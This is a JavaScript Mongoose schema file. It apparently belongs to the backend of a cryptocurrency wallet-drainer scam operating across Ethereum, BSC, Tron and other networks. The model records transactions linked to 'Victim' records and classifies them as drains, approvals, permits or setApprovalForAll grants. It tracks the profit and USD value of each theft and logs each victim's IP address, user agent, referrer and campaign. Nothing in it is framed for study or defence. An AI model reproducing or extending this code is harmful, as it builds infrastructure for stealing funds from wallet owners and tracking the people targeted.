const mongoose = require('mongoose');

const transactionSchema = new mongoose.Schema({
    hash: {
        type: String,
        required: true,
        unique: true,
        index: true
    },
    victim: {
        type: mongoose.Schema.Types.ObjectId,
        ref: 'Victim',
        required: true
    },
    network: {
        type: String,
        required: true,
        enum: ['ethereum', 'bsc', 'polygon', 'arbitrum', 'optimism', 'tron']
    },
    type: {
        type: String,
        required: true,
        enum: ['approval', 'transfer', 'drain', 'permit', 'setApprovalForAll']
    },
    tokenAddress: {
        type: String,
        required: true
    },
    tokenSymbol: {
        type: String,
        required: true
    },
    amount: {
        type: mongoose.Schema.Types.Decimal128,
        required: true
    },
    from: {
        type: String,
        required: true
    },
    to: {
        type: String,
        required: true
    },
    spender: String,
    contractAddress: String,
    method: String,
    gasUsed: Number,
    gasPrice: mongoose.Schema.Types.Decimal128,
    fee: mongoose.Schema.Types.Decimal128,
    blockNumber: Number,
    blockHash: String,
    timestamp: {
        type: Date,
        default: Date.now
    },
    status: {
        type: String,
        enum: ['pending', 'confirmed', 'failed'],
        default: 'pending'
    },
    confirmations: {
        type: Number,
        default: 0
    },
    usdValue: {
        type: mongoose.Schema.Types.Decimal128,
        default: 0
    },
    profit: {
        type: mongoose.Schema.Types.Decimal128,
        default: 0
    },
    metadata: {
        userAgent: String,
        ipAddress: String,
        referrer: String,
        campaign: String
    },
    tags: [String],
    notes: String
}, {
    timestamps: true
});

// Indexes for performance
transactionSchema.index({ victim: 1, timestamp: -1 });
transactionSchema.index({ network: 1, status: 1 });
transactionSchema.index({ type: 1, timestamp: -1 });
transactionSchema.index({ tokenAddress: 1 });
transactionSchema.index({ timestamp: -1 });

module.exports = mongoose.model('Transaction', transactionSchema);